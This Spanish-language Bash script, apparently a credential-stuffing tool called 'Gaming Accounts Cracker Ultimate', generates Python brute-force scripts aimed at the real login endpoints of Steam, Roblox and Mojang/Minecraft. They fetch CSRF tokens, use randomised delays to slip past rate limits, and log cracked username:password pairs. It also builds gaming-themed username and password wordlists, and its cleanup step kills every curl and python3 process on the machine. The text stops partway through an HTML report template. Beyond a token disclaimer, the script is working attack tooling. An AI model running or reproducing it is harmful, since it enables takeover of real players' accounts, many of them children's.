#!/bin/bash

# 🎮 GAMING ACCOUNTS CRACKER ULTIMATE
# Fuerza bruta específica para cuentas de gaming - Steam, Roblox, Minecraft, etc.
# Autor: X (sebastian.corao) 
# Fecha: $(date)

# 🔴 ADVERTENCIA LEGAL
echo "
 ██████╗  █████╗ ███╗   ███╗██╗███╗   ██╗ ██████╗      ██████╗██████╗  █████╗  ██████╗██╗  ██╗███████╗██████╗ 
██╔════╝ ██╔══██╗████╗ ████║██║████╗  ██║██╔════╝     ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
██║  ███╗███████║██╔████╔██║██║██╔██╗ ██║██║  ███╗    ██║     ██████╔╝███████║██║     █████╔╝ █████╗  ██████╔╝
██║   ██║██╔══██║██║╚██╔╝██║██║██║╚██╗██║██║   ██║    ██║     ██╔══██╗██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
╚██████╔╝██║  ██║██║ ╚═╝ ██║██║██║ ╚████║╚██████╔╝    ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
 ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝      ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                                                                                               
🎮 GAMING ACCOUNTS CRACKER - STEAM, ROBLOX, MINECRAFT Y MÁS 🎮
"

echo "🔴 ADVERTENCIA LEGAL:"
echo "Este script es SOLO para pentesting autorizado y fines educativos."
echo "Atacar cuentas de gaming sin autorización es ILEGAL."
echo "Steam, Roblox, Minecraft y otras plataformas tienen protecciones anti-bot."
echo "Úsalo bajo tu propia responsabilidad."
echo ""
read -p "¿Entiendes y aceptas? (s/N): " acepta
if [[ ! "$acepta" =~ ^[Ss]$ ]]; then
    echo "❌ Operación cancelada"
    exit 1
fi

# Colores
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # Sin color

# Variables globales
WORKDIR="gaming_cracker_results_$(date +%Y%m%d_%H%M%S)"
LOG_FILE="$WORKDIR/gaming_cracker_ultimate.log"
USER_AGENT="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

# Función de limpieza
cleanup() {
    echo ""
    echo -e "${YELLOW}🧹 Limpiando procesos...${NC}"
    pkill -f curl 2>/dev/null || true
    pkill -f python3 2>/dev/null || true
    echo -e "${GREEN}✅ Limpieza completada${NC}"
}

# Configurar trap para limpieza
trap cleanup EXIT INT TERM

# Verificar herramientas
verificar_herramientas() {
    echo -e "${BLUE}🔍 Verificando herramientas...${NC}"
    
    # Verificar curl
    if command -v curl >/dev/null 2>&1; then
        echo -e "${GREEN}✅ curl encontrado${NC}"
    else
        echo -e "${RED}❌ curl no encontrado${NC}"
        echo "Instalar con: apt install curl"
        exit 1
    fi
    
    # Verificar python3
    if command -v python3 >/dev/null 2>&1; then
        echo -e "${GREEN}✅ python3 encontrado${NC}"
    else
        echo -e "${RED}❌ python3 no encontrado${NC}"
        echo "Instalar con: apt install python3"
        exit 1
    fi
    
    # Verificar bibliotecas de python opcionales
    command -v jq >/dev/null 2>&1 && echo -e "${GREEN}✅ jq disponible${NC}"
    python3 -c "import requests" 2>/dev/null && echo -e "${GREEN}✅ python requests disponible${NC}"
    python3 -c "import selenium" 2>/dev/null && echo -e "${GREEN}✅ selenium disponible${NC}"
    
    echo ""
}

# Configurar directorio de trabajo
configurar_directorio() {
    echo -e "${BLUE}📁 Configurando directorio de trabajo...${NC}"
    
    mkdir -p "$WORKDIR"/{usernames,passwords,proxies,results,scripts,reports}
    
    echo -e "${GREEN}✅ Directorio creado: $WORKDIR${NC}"
    echo ""
}

# Gestión de plataformas gaming
gestionar_plataformas() {
    echo -e "${PURPLE}🎮 GESTIÓN DE PLATAFORMAS GAMING${NC}"
    echo ""
    echo "Plataformas disponibles:"
    echo "1) 🎯 Steam (steamcommunity.com)"
    echo "2) 🎲 Roblox (roblox.com)"
    echo "3) ⛏️ Minecraft (minecraft.net)"
    echo "4) 🎪 Epic Games (epicgames.com)"
    echo "5) 🎮 Xbox Live (xbox.com)"
    echo "6) 🎯 PlayStation Network (playstation.com)"
    echo "7) 🎪 Origin/EA (ea.com)"
    echo "8) 🎮 Uplay/Ubisoft Connect (ubisoft.com)"
    echo "9) 🎯 Battle.net/Blizzard (battle.net)"
    echo "10) 🎮 GOG (gog.com)"
    echo "11) 🎪 Twitch (twitch.tv)"
    echo "12) 🎲 Discord Gaming (discord.com)"
    echo "13) 🔧 Plataforma personalizada"
    echo "14) ⬅️ Volver al menú principal"
    echo ""
    
    read -p "Selecciona plataforma [1-14]: " platform_choice
    
    case $platform_choice in
        1) configurar_steam ;;
        2) configurar_roblox ;;
        3) configurar_minecraft ;;
        4) configurar_epic ;;
        5) configurar_xbox ;;
        6) configurar_playstation ;;
        7) configurar_origin ;;
        8) configurar_uplay ;;
        9) configurar_battlenet ;;
        10) configurar_gog ;;
        11) configurar_twitch ;;
        12) configurar_discord ;;
        13) configurar_custom_platform ;;
        14) return ;;
        *) echo -e "${RED}❌ Opción inválida${NC}" ;;
    esac
    
    echo ""
    read -p "Presiona Enter para continuar..."
}

# Configurar Steam
configurar_steam() {
    echo -e "${CYAN}🎯 CONFIGURAR STEAM${NC}"
    echo ""
    echo "Steam utiliza protecciones anti-bot muy fuertes."
    echo "Métodos disponibles:"
    echo "1) API Steam (requiere Steam API key)"
    echo "2) Web scraping básico (limitado)"
    echo "3) Selenium automatizado (más efectivo pero detectable)"
    echo ""
    
    read -p "Método [1-3]: " steam_method
    
    platform_file="$WORKDIR/platforms/steam_config.txt"
    mkdir -p "$WORKDIR/platforms"
    
    cat > "$platform_file" << EOF
PLATFORM:steam
NAME:Steam Community
LOGIN_URL:https://steamcommunity.com/login
API_URL:https://api.steampowered.com
METHOD:$steam_method
USER_AGENT:$USER_AGENT
RATE_LIMIT:5
DELAY:10
CAPTCHA_PROTECTED:yes
ANTI_BOT:high
EOF

    if [[ "$steam_method" == "1" ]]; then
        read -p "Steam API Key: " api_key
        echo "API_KEY:$api_key" >> "$platform_file"
    fi

    echo -e "${GREEN}✅ Steam configurado${NC}"
    
    # Crear script específico para Steam
    crear_script_steam "$steam_method"
}

# Configurar Roblox
configurar_roblox() {
    echo -e "${CYAN}🎲 CONFIGURAR ROBLOX${NC}"
    echo ""
    echo "Roblox tiene protecciones moderadas."
    echo ""
    
    platform_file="$WORKDIR/platforms/roblox_config.txt"
    mkdir -p "$WORKDIR/platforms"
    
    cat > "$platform_file" << EOF
PLATFORM:roblox
NAME:Roblox
LOGIN_URL:https://www.roblox.com/login
API_URL:https://auth.roblox.com/v2/login
METHOD:web_api
USER_AGENT:$USER_AGENT
RATE_LIMIT:3
DELAY:5
CAPTCHA_PROTECTED:yes
ANTI_BOT:medium
EOF

    echo -e "${GREEN}✅ Roblox configurado${NC}"
    
    # Crear script específico para Roblox
    crear_script_roblox
}

# Configurar Minecraft
configurar_minecraft() {
    echo -e "${CYAN}⛏️ CONFIGURAR MINECRAFT${NC}"
    echo ""
    echo "Minecraft (Mojang/Microsoft) tiene protecciones fuertes."
    echo ""
    
    platform_file="$WORKDIR/platforms/minecraft_config.txt"
    mkdir -p "$WORKDIR/platforms"
    
    cat > "$platform_file" << EOF
PLATFORM:minecraft
NAME:Minecraft/Mojang
LOGIN_URL:https://minecraft.net/en-us/login
API_URL:https://authserver.mojang.com/authenticate
METHOD:mojang_api
USER_AGENT:$USER_AGENT
RATE_LIMIT:2
DELAY:15
CAPTCHA_PROTECTED:yes
ANTI_BOT:high
EOF

    echo -e "${GREEN}✅ Minecraft configurado${NC}"
    
    # Crear script específico para Minecraft
    crear_script_minecraft
}

# Crear script para Steam
crear_script_steam() {
    local method="$1"
    
    cat > "$WORKDIR/scripts/steam_cracker.py" << 'EOF'
#!/usr/bin/env python3
"""
Steam Account Cracker
Método básico para fines educativos
"""

import requests
import time
import sys
import random
from urllib.parse import urlencode

class SteamCracker:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.login_url = "https://steamcommunity.com/login/dologin/"
        self.rate_limit = 5  # segundos entre intentos
        
    def attempt_login(self, username, password):
        """Intenta login básico (limitado por protecciones de Steam)"""
        
        data = {
            'username': username,
            'password': password,
            'emailauth': '',
            'loginfriendlyname': 'Python Bot',
            'captchagid': -1,
            'captcha_text': '',
            'emailsteamid': '',
            'rsatimestamp': '',
            'remember_login': 'false'
        }
        
        try:
            # Steam requiere muchos pasos adicionales en la realidad
            # Este es un ejemplo simplificado
            response = self.session.post(
                self.login_url,
                data=urlencode(data),
                headers={'Content-Type': 'application/x-www-form-urlencoded'},
                timeout=10
            )
            
            # Indicadores de éxito/fallo (simplificados)
            if 'success' in response.text.lower():
                return True, "Login exitoso"
            elif 'captcha' in response.text.lower():
                return False, "CAPTCHA requerido"
            elif 'rate' in response.text.lower():
                return False, "Rate limited"
            else:
                return False, "Credenciales incorrectas"
                
        except Exception as e:
            return False, f"Error: {str(e)}"
    
    def crack_from_lists(self, userfile, passfile, output_file):
        """Ejecuta ataque de fuerza bruta desde archivos"""
        
        print(f"🎯 Iniciando cracking Steam")
        print(f"📄 Usuarios: {userfile}")
        print(f"🔐 Contraseñas: {passfile}")
        print(f"📝 Salida: {output_file}")
        print("⚠️  ADVERTENCIA: Steam tiene protecciones anti-bot muy fuertes")
        print("")
        
        successes = 0
        attempts = 0
        
        try:
            with open(userfile, 'r') as uf, open(passfile, 'r') as pf:
                usernames = [line.strip() for line in uf if line.strip()]
                passwords = [line.strip() for line in pf if line.strip()]
            
            total_attempts = len(usernames) * len(passwords)
            print(f"📊 Total intentos planificados: {total_attempts}")
            print("")
            
            with open(output_file, 'w') as outf:
                outf.write("# Steam Cracking Results\n")
                outf.write("# Format: username:password:status:details\n\n")
                
                for username in usernames:
                    for password in passwords:
                        attempts += 1
                        
                        print(f"[{attempts}/{total_attempts}] Probando {username}:{password[:3]}{'*' * (len(password)-3)}")
                        
                        success, details = self.attempt_login(username, password)
                        
                        result_line = f"{username}:{password}:{'SUCCESS' if success else 'FAILED'}:{details}\n"
                        outf.write(result_line)
                        
                        if success:
                            successes += 1
                            print(f"✅ ÉXITO: {username}:{password}")
                        else:
                            print(f"❌ Fallo: {details}")
                        
                        # Rate limiting
                        delay = self.rate_limit + random.uniform(1, 5)
                        print(f"⏳ Esperando {delay:.1f} segundos...")
                        time.sleep(delay)
                        
                        # Parar si hay muchos rate limits
                        if "rate limited" in details.lower():
                            print("🛑 Demasiados rate limits, pausando...")
                            time.sleep(60)
        
        except KeyboardInterrupt:
            print("\n🛑 Interrumpido por el usuario")
        except Exception as e:
            print(f"❌ Error: {e}")
        
        finally:
            print(f"\n📊 Resumen:")
            print(f"✅ Éxitos: {successes}")
            print(f"📝 Intentos: {attempts}")
            print(f"💾 Resultados guardados en: {output_file}")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Uso: python3 steam_cracker.py <userfile> <passfile> <output>")
        sys.exit(1)
    
    cracker = SteamCracker()
    cracker.crack_from_lists(sys.argv[1], sys.argv[2], sys.argv[3])
EOF

    chmod +x "$WORKDIR/scripts/steam_cracker.py"
    echo -e "${GREEN}✅ Script Steam creado${NC}"
}

# Crear script para Roblox
crear_script_roblox() {
    cat > "$WORKDIR/scripts/roblox_cracker.py" << 'EOF'
#!/usr/bin/env python3
"""
Roblox Account Cracker
Método básico para fines educativos
"""

import requests
import time
import sys
import random
import json

class RobloxCracker:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Content-Type': 'application/json'
        })
        self.login_url = "https://auth.roblox.com/v2/login"
        self.rate_limit = 3
        
    def get_csrf_token(self):
        """Obtiene token CSRF necesario para Roblox"""
        try:
            response = self.session.post(self.login_url, json={})
            return response.headers.get('x-csrf-token', '')
        except:
            return ''
    
    def attempt_login(self, username, password):
        """Intenta login en Roblox"""
        
        # Obtener token CSRF
        csrf_token = self.get_csrf_token()
        if csrf_token:
            self.session.headers.update({'X-CSRF-TOKEN': csrf_token})
        
        data = {
            'ctype': 'Username',
            'cvalue': username,
            'password': password
        }
        
        try:
            response = self.session.post(
                self.login_url,
                json=data,
                timeout=10
            )
            
            if response.status_code == 200:
                result = response.json()
                if result.get('user'):
                    return True, "Login exitoso"
                else:
                    return False, result.get('errors', [{}])[0].get('message', 'Credenciales incorrectas')
            elif response.status_code == 429:
                return False, "Rate limited"
            elif response.status_code == 403:
                return False, "CAPTCHA o token inválido"
            else:
                return False, f"HTTP {response.status_code}"
                
        except Exception as e:
            return False, f"Error: {str(e)}"
    
    def crack_from_lists(self, userfile, passfile, output_file):
        """Ejecuta ataque de fuerza bruta"""
        
        print(f"🎲 Iniciando cracking Roblox")
        print(f"📄 Usuarios: {userfile}")
        print(f"🔐 Contraseñas: {passfile}")
        print(f"📝 Salida: {output_file}")
        print("")
        
        successes = 0
        attempts = 0
        
        try:
            with open(userfile, 'r') as uf, open(passfile, 'r') as pf:
                usernames = [line.strip() for line in uf if line.strip()]
                passwords = [line.strip() for line in pf if line.strip()]
            
            total_attempts = len(usernames) * len(passwords)
            print(f"📊 Total intentos: {total_attempts}")
            print("")
            
            with open(output_file, 'w') as outf:
                outf.write("# Roblox Cracking Results\n\n")
                
                for username in usernames:
                    for password in passwords:
                        attempts += 1
                        
                        print(f"[{attempts}/{total_attempts}] {username}:{password[:3]}***")
                        
                        success, details = self.attempt_login(username, password)
                        
                        result_line = f"{username}:{password}:{'SUCCESS' if success else 'FAILED'}:{details}\n"
                        outf.write(result_line)
                        
                        if success:
                            successes += 1
                            print(f"✅ ÉXITO: {username}:{password}")
                        else:
                            print(f"❌ {details}")
                        
                        # Rate limiting
                        delay = self.rate_limit + random.uniform(1, 3)
                        time.sleep(delay)
        
        except KeyboardInterrupt:
            print("\n🛑 Interrumpido")
        except Exception as e:
            print(f"❌ Error: {e}")
        
        finally:
            print(f"\n📊 Éxitos: {successes}/{attempts}")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Uso: python3 roblox_cracker.py <userfile> <passfile> <output>")
        sys.exit(1)
    
    cracker = RobloxCracker()
    cracker.crack_from_lists(sys.argv[1], sys.argv[2], sys.argv[3])
EOF

    chmod +x "$WORKDIR/scripts/roblox_cracker.py"
    echo -e "${GREEN}✅ Script Roblox creado${NC}"
}

# Crear script para Minecraft
crear_script_minecraft() {
    cat > "$WORKDIR/scripts/minecraft_cracker.py" << 'EOF'
#!/usr/bin/env python3
"""
Minecraft Account Cracker (Mojang API)
Método básico para fines educativos
"""

import requests
import time
import sys
import random
import json

class MinecraftCracker:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Content-Type': 'application/json'
        })
        self.auth_url = "https://authserver.mojang.com/authenticate"
        self.rate_limit = 2
        
    def attempt_login(self, username, password):
        """Intenta autenticación con Mojang API"""
        
        data = {
            'agent': {
                'name': 'Minecraft',
                'version': 1
            },
            'username': username,
            'password': password,
            'clientToken': 'python-client-' + str(random.randint(1000, 9999))
        }
        
        try:
            response = self.session.post(
                self.auth_url,
                json=data,
                timeout=10
            )
            
            if response.status_code == 200:
                result = response.json()
                if result.get('accessToken'):
                    profile = result.get('selectedProfile', {})
                    return True, f"Login exitoso - UUID: {profile.get('id', 'N/A')}"
                else:
                    return False, "Token inválido"
            elif response.status_code == 403:
                error_data = response.json()
                error_msg = error_data.get('errorMessage', 'Credenciales inválidas')
                return False, error_msg
            elif response.status_code == 429:
                return False, "Rate limited"
            else:
                return False, f"HTTP {response.status_code}"
                
        except Exception as e:
            return False, f"Error: {str(e)}"
    
    def crack_from_lists(self, userfile, passfile, output_file):
        """Ejecuta ataque de fuerza bruta"""
        
        print(f"⛏️  Iniciando cracking Minecraft")
        print(f"📄 Usuarios: {userfile}")
        print(f"🔐 Contraseñas: {passfile}")
        print(f"📝 Salida: {output_file}")
        print("")
        
        successes = 0
        attempts = 0
        
        try:
            with open(userfile, 'r') as uf, open(passfile, 'r') as pf:
                usernames = [line.strip() for line in uf if line.strip()]
                passwords = [line.strip() for line in pf if line.strip()]
            
            with open(output_file, 'w') as outf:
                outf.write("# Minecraft Cracking Results\n\n")
                
                for username in usernames:
                    for password in passwords:
                        attempts += 1
                        
                        print(f"[{attempts}] {username}:{password[:3]}***")
                        
                        success, details = self.attempt_login(username, password)
                        
                        result_line = f"{username}:{password}:{'SUCCESS' if success else 'FAILED'}:{details}\n"
                        outf.write(result_line)
                        
                        if success:
                            successes += 1
                            print(f"✅ ÉXITO: {username}:{password} - {details}")
                        else:
                            print(f"❌ {details}")
                        
                        # Rate limiting más estricto para Mojang
                        delay = self.rate_limit + random.uniform(2, 8)
                        time.sleep(delay)
        
        except KeyboardInterrupt:
            print("\n🛑 Interrumpido")
        except Exception as e:
            print(f"❌ Error: {e}")
        
        finally:
            print(f"\n📊 Éxitos: {successes}/{attempts}")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Uso: python3 minecraft_cracker.py <userfile> <passfile> <output>")
        sys.exit(1)
    
    cracker = MinecraftCracker()
    cracker.crack_from_lists(sys.argv[1], sys.argv[2], sys.argv[3])
EOF

    chmod +x "$WORKDIR/scripts/minecraft_cracker.py"
    echo -e "${GREEN}✅ Script Minecraft creado${NC}"
}

# Gestión de usuarios gaming
gestionar_usuarios_gaming() {
    echo -e "${PURPLE}👥 GESTIÓN DE USUARIOS GAMING${NC}"
    echo ""
    echo "Opciones:"
    echo "1) 📝 Crear lista de usuarios gaming personalizada"
    echo "2) 📥 Descargar usuarios gaming comunes"
    echo "3) 🎮 Generar usuarios por plataforma"
    echo "4) 🔍 Extraer usuarios de perfiles públicos"
    echo "5) 📋 Listar usuarios disponibles"
    echo "6) ⬅️ Volver al menú principal"
    echo ""
    
    read -p "Selecciona opción [1-6]: " opcion
    
    case $opcion in
        1) crear_usuarios_gaming ;;
        2) descargar_usuarios_gaming ;;
        3) generar_usuarios_plataforma ;;
        4) extraer_usuarios_publicos ;;
        5) listar_usuarios_gaming ;;
        6) return ;;
        *) echo -e "${RED}❌ Opción inválida${NC}" ;;
    esac
    
    echo ""
    read -p "Presiona Enter para continuar..."
}

# Crear usuarios gaming
crear_usuarios_gaming() {
    echo -e "${CYAN}📝 CREAR USUARIOS GAMING${NC}"
    echo ""
    
    users_file="$WORKDIR/usernames/gaming_users_$(date +%H%M%S).txt"
    
    echo "Introduce información para generar usuarios gaming:"
    read -p "Nombres de jugadores conocidos (separados por espacios): " known_players
    read -p "Clanes/guilds (separados por espacios): " clans
    read -p "Términos gaming favoritos: " gaming_terms
    
    echo -e "${YELLOW}📝 Generando usuarios gaming...${NC}"
    
    # Base de usuarios gaming común
    cat > "$users_file" << 'EOF'
player
gamer
user
guest
admin
moderator
mod
op
owner
staff
helper
vip
premium
pro
noob
newbie
test
demo
trial
steam
origin
epic
uplay
xbox
psn
nintendo
minecraft
roblox
fortnite
valorant
csgo
dota
league
wow
pubg
cod
fifa
madden
2k
nba
nfl
mlb
nhl
master
legend
champion
winner
killer
sniper
ninja
warrior
mage
rogue
paladin
hunter
tank
dps
healer
support
carry
feeder
toxic
smurf
main
alt
backup
EOF

    # Agregar jugadores conocidos
    if [[ -n "$known_players" ]]; then
        for player in $known_players; do
            player_clean=$(echo "$player" | tr '[:upper:]' '[:lower:]' | sed 's/[^a-z0-9]//g')
            echo "$player_clean" >> "$users_file"
            echo "${player_clean}123" >> "$users_file"
            echo "${player_clean}2024" >> "$users_file"
            echo "pro${player_clean}" >> "$users_file"
            echo "${player_clean}pro" >> "$users_file"
        done
    fi
    
    # Agregar clanes
    if [[ -n "$clans" ]]; then
        for clan in $clans; do
            clan_clean=$(echo "$clan" | tr '[:upper:]' '[:lower:]' | sed 's/[^a-z0-9]//g')
            echo "$clan_clean" >> "$users_file"
            echo "${clan_clean}member" >> "$users_file"
            echo "${clan_clean}leader" >> "$users_file"
            echo "${clan_clean}admin" >> "$users_file"
        done
    fi
    
    # Agregar términos gaming
    if [[ -n "$gaming_terms" ]]; then
        for term in $gaming_terms; do
            term_clean=$(echo "$term" | tr '[:upper:]' '[:lower:]' | sed 's/[^a-z0-9]//g')
            echo "$term_clean" >> "$users_file"
            echo "${term_clean}123" >> "$users_file"
            echo "pro${term_clean}" >> "$users_file"
        done
    fi
    
    # Eliminar duplicados
    sort "$users_file" | uniq > "${users_file}.tmp"
    mv "${users_file}.tmp" "$users_file"
    
    lines=$(wc -l < "$users_file")
    echo -e "${GREEN}✅ Usuarios gaming creados: $users_file ($lines usuarios)${NC}"
}

# Gestión de contraseñas gaming
gestionar_passwords_gaming() {
    echo -e "${PURPLE}🔐 GESTIÓN DE CONTRASEÑAS GAMING${NC}"
    echo ""
    echo "Opciones:"
    echo "1) 🎮 Crear contraseñas gaming personalizadas"
    echo "2) 📥 Descargar contraseñas gaming comunes"
    echo "3) 🔄 Generar variaciones gaming"
    echo "4) 📋 Listar contraseñas disponibles"
    echo "5) ⬅️ Volver al menú principal"
    echo ""
    
    read -p "Selecciona opción [1-5]: " opcion
    
    case $opcion in
        1) crear_passwords_gaming ;;
        2) descargar_passwords_gaming ;;
        3) generar_variaciones_gaming ;;
        4) listar_passwords_gaming ;;
        5) return ;;
        *) echo -e "${RED}❌ Opción inválida${NC}" ;;
    esac
    
    echo ""
    read -p "Presiona Enter para continuar..."
}

# Crear contraseñas gaming
crear_passwords_gaming() {
    echo -e "${CYAN}🎮 CREAR CONTRASEÑAS GAMING${NC}"
    echo ""
    
    pass_file="$WORKDIR/passwords/gaming_passwords_$(date +%H%M%S).txt"
    
    echo "Información para generar contraseñas gaming:"
    read -p "Juegos favoritos: " favorite_games
    read -p "Años relevantes: " years
    read -p "Números favoritos: " numbers
    
    echo -e "${YELLOW}🔐 Generando contraseñas gaming...${NC}"
    
    # Base de contraseñas gaming
    cat > "$pass_file" << 'EOF'
123456
password
admin
guest
gamer
player
gaming
minecraft
roblox
fortnite
steam123
xbox123
playstation
nintendo
switch
pokemon
mario
sonic
zelda
pacman
tetris
pong
arcade
retro
pixel
8bit
16bit
console
controller
joystick
gamepad
headset
victory
defeat
respawn
checkpoint
achievement
trophy
medal
score
highscore
leaderboard
guild
clan
party
squad
team
match
round
level
stage
boss
final
epic
legendary
mythic
rare
common
loot
drop
item
weapon
armor
shield
sword
gun
rifle
sniper
knife
grenade
bomb
magic
spell
potion
health
mana
energy
power
speed
strength
defense
attack
critical
combo
special
ultimate
super
mega
ultra
hyper
turbo
boost
rush
dash
jump
run
walk
crawl
swim
fly
teleport
invisible
stealth
ninja
warrior
mage
rogue
paladin
priest
hunter
ranger
archer
tank
dps
healer
support
carry
adc
mid
top
jungle
bot
lane
farm
gank
ward
baron
dragon
nexus
base
tower
minion
creep
mob
npc
ai
bot
hack
cheat
mod
script
exploit
glitch
bug
lag
ping
fps
graphics
settings
options
config
profile
account
login
password
username
email
verify
confirm
activate
register
signup
signin
logout
quit
exit
gg
wp
noob
pro
skill
talent
gift
luck
chance
random
chaos
order
good
evil
light
dark
fire
water
earth
air
ice
lightning
thunder
storm
wind
rain
snow
sun
moon
star
space
time
past
future
dream
nightmare
heaven
hell
angel
demon
god
devil
king
queen
prince
princess
lord
master
boss
chief
captain
general
soldier
guard
knight
wizard
witch
fairy
dragon
monster
beast
animal
cat
dog
wolf
bear
lion
tiger
eagle
shark
snake
spider
robot
alien
zombie
ghost
vampire
pirate
cowboy
samurai
ninja2024
gamer2024
EOF

    # Agregar juegos favoritos
    if [[ -n "$favorite_games" ]]; then
        for game in $favorite_games; do
            game_clean=$(echo "$game" | tr '[:upper:]' '[:lower:]' | sed 's/[^a-z0-9]//g')
            echo "$game_clean" >> "$pass_file"
            echo "${game_clean}123" >> "$pass_file"
            echo "${game_clean}2024" >> "$pass_file"
            echo "${game_clean}password" >> "$pass_file"
            echo "password${game_clean}" >> "$pass_file"
            echo "${game_clean}gamer" >> "$pass_file"
            echo "gamer${game_clean}" >> "$pass_file"
        done
    fi
    
    # Agregar años
    if [[ -n "$years" ]]; then
        for year in $years; do
            echo "$year" >> "$pass_file"
            echo "gamer${year}" >> "$pass_file"
            echo "password${year}" >> "$pass_file"
            echo "gaming${year}" >> "$pass_file"
        done
    fi
    
    # Agregar números
    if [[ -n "$numbers" ]]; then
        for num in $numbers; do
            echo "$num" >> "$pass_file"
            echo "gamer${num}" >> "$pass_file"
            echo "password${num}" >> "$pass_file"
            echo "player${num}" >> "$pass_file"
        done
    fi
    
    # Eliminar duplicados y ordenar por longitud
    sort "$pass_file" | uniq | awk '{ print length($0) " " $0; }' | sort -n | cut -d' ' -f2- > "${pass_file}.tmp"
    mv "${pass_file}.tmp" "$pass_file"
    
    lines=$(wc -l < "$pass_file")
    echo -e "${GREEN}✅ Contraseñas gaming creadas: $pass_file ($lines contraseñas)${NC}"
}

# Ejecutar ataques
ejecutar_ataques() {
    echo -e "${PURPLE}⚔️ EJECUTAR ATAQUES${NC}"
    echo ""
    
    # Verificar archivos necesarios
    if ! ls "$WORKDIR/platforms"/*.txt >/dev/null 2>&1; then
        echo -e "${RED}❌ No hay plataformas configuradas${NC}"
        return
    fi
    
    if ! ls "$WORKDIR/usernames"/*.txt >/dev/null 2>&1; then
        echo -e "${RED}❌ No hay listas de usuarios${NC}"
        return
    fi
    
    if ! ls "$WORKDIR/passwords"/*.txt >/dev/null 2>&1; then
        echo -e "${RED}❌ No hay listas de contraseñas${NC}"
        return
    fi
    
    echo "Tipos de ataque:"
    echo "1) 🚀 Ataque rápido (credenciales comunes)"
    echo "2) 🔥 Ataque intensivo (listas completas)"
    echo "3) 🎯 Ataque por plataforma específica"
    echo "4) 🌊 Ataque masivo (todas las plataformas)"
    echo "5) ⬅️ Volver al menú principal"
    echo ""
    
    read -p "Selecciona tipo [1-5]: " attack_type
    
    case $attack_type in
        1) ataque_rapido_gaming ;;
        2) ataque_intensivo_gaming ;;
        3) ataque_plataforma_especifica ;;
        4) ataque_masivo_gaming ;;
        5) return ;;
        *) echo -e "${RED}❌ Opción inválida${NC}" ;;
    esac
}

# Ataque rápido gaming
ataque_rapido_gaming() {
    echo -e "${CYAN}🚀 ATAQUE RÁPIDO GAMING${NC}"
    echo ""
    
    # Crear listas rápidas
    quick_users="$WORKDIR/usernames/quick_gaming_users.txt"
    quick_passes="$WORKDIR/passwords/quick_gaming_passwords.txt"
    
    cat > "$quick_users" << 'EOF'
admin
gamer
player
user
guest
test
demo
minecraft
roblox
steam
xbox
playstation
EOF

    cat > "$quick_passes" << 'EOF'
123456
password
admin
gamer
minecraft
roblox
steam123
xbox123
gaming
player123
EOF

    echo -e "${YELLOW}🚀 Iniciando ataque rápido...${NC}"
    
    # Ejecutar en todas las plataformas configuradas
    for platform_file in "$WORKDIR/platforms"/*.txt; do
        if [[ -f "$platform_file" ]]; then
            platform_name=$(grep "PLATFORM:" "$platform_file" | cut -d: -f2)
            echo -e "${CYAN}🎯 Atacando $platform_name...${NC}"
            
            ejecutar_ataque_plataforma "$platform_file" "$quick_users" "$quick_passes"
        fi
    done
    
    echo -e "${GREEN}✅ Ataque rápido completado${NC}"
}

# Ejecutar ataque por plataforma
ejecutar_ataque_plataforma() {
    local platform_file="$1"
    local user_file="$2"
    local pass_file="$3"
    
    platform_name=$(grep "PLATFORM:" "$platform_file" | cut -d: -f2)
    result_file="$WORKDIR/results/${platform_name}_attack_$(date +%H%M%S).txt"
    
    echo -e "${CYAN}🎮 Atacando $platform_name${NC}"
    echo "Usuarios: $(wc -l < "$user_file") entradas"
    echo "Contraseñas: $(wc -l < "$pass_file") entradas"
    echo ""
    
    # Ejecutar script específico de la plataforma
    case $platform_name in
        "steam")
            if [[ -f "$WORKDIR/scripts/steam_cracker.py" ]]; then
                python3 "$WORKDIR/scripts/steam_cracker.py" "$user_file" "$pass_file" "$result_file"
            fi
            ;;
        "roblox")
            if [[ -f "$WORKDIR/scripts/roblox_cracker.py" ]]; then
                python3 "$WORKDIR/scripts/roblox_cracker.py" "$user_file" "$pass_file" "$result_file"
            fi
            ;;
        "minecraft")
            if [[ -f "$WORKDIR/scripts/minecraft_cracker.py" ]]; then
                python3 "$WORKDIR/scripts/minecraft_cracker.py" "$user_file" "$pass_file" "$result_file"
            fi
            ;;
        *)
            echo -e "${YELLOW}⚠️ No hay script específico para $platform_name${NC}"
            ;;
    esac
    
    # Mostrar resultados
    if [[ -f "$result_file" ]]; then
        success_count=$(grep -c "SUCCESS" "$result_file" 2>/dev/null || echo "0")
        echo -e "${GREEN}📊 $platform_name: $success_count éxitos${NC}"
        
        if [[ $success_count -gt 0 ]]; then
            echo -e "${CYAN}🎉 Credenciales encontradas:${NC}"
            grep "SUCCESS" "$result_file" | head -5
        fi
    fi
    
    echo ""
}

# Generar reporte final gaming
generar_reporte_gaming() {
    echo -e "${PURPLE}📊 GENERAR REPORTE GAMING${NC}"
    echo ""
    
    report_file="$WORKDIR/reports/gaming_cracker_report_$(date +%Y%m%d_%H%M%S).html"
    
    echo -e "${YELLOW}📝 Generando reporte HTML...${NC}"
    
    cat > "$report_file" << EOF
<!DOCTYPE html>
<html>
<head>
    <title>Gaming Cracker Ultimate - Reporte</title>
    <meta charset="UTF-8">
    <style>
        body { 
            font-family: 'Courier New', monospace; 
            background: linear-gradient(135deg, #0f0f23, #1a1a2e);
